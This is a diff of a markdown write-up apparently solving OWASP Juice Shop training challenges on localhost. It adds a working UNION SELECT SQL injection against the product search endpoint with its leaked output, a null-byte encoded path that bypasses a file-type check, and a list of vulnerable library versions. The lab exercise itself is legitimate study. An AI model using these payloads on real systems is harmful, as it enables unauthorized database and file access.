@@ -240,14 +240,26 @@ http://localhost:3000/ftp<br>
 GET /ftp/package.json.bak%2500.md HTTP/1.1<br>
 
 ### Leaked Unsafe Product
-burp suite > proxy > repeater
-GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1
-id":11,"name":"Rippertuer Special Juice","description":"Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br />This item has been made unavailable because of lack of safety standards. (This product is unsafe! We plan to remove it from the stock!)"
-https://pastebin.com/90dUgd7s
-http://localhost:3000/#/contact
-Comment: Hueteroneel Eurogium Edule
+burp suite > proxy > repeater<br>
+GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1<br>
+id":11,"name":"Rippertuer Special Juice","description":"Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br />This item has been made unavailable because of lack of safety standards. (This product is unsafe! We plan to remove it from the stock!)"<br>
+https://pastebin.com/90dUgd7s<br>
+http://localhost:3000/#/contact<br>
+Comment: Hueteroneel Eurogium Edule<br>
 
-### Legacy Typosquatting 
+### Vulnerable Library
+http://localhost:3000/ftp<br>
+GET /ftp/package.json.bak%2500.md HTTP/1.1<br>
+http://localhost:3000/#/contact<br>
+Commentmarsdb ~0.6,grunt ~1.0,express-jwt 0.1.3,js-yaml 3.10,sequelize ~4,sanitize-html 1.4.2,socket.io ~2.0<br>
+
+
+
+
+
+
+
+
 
 
 
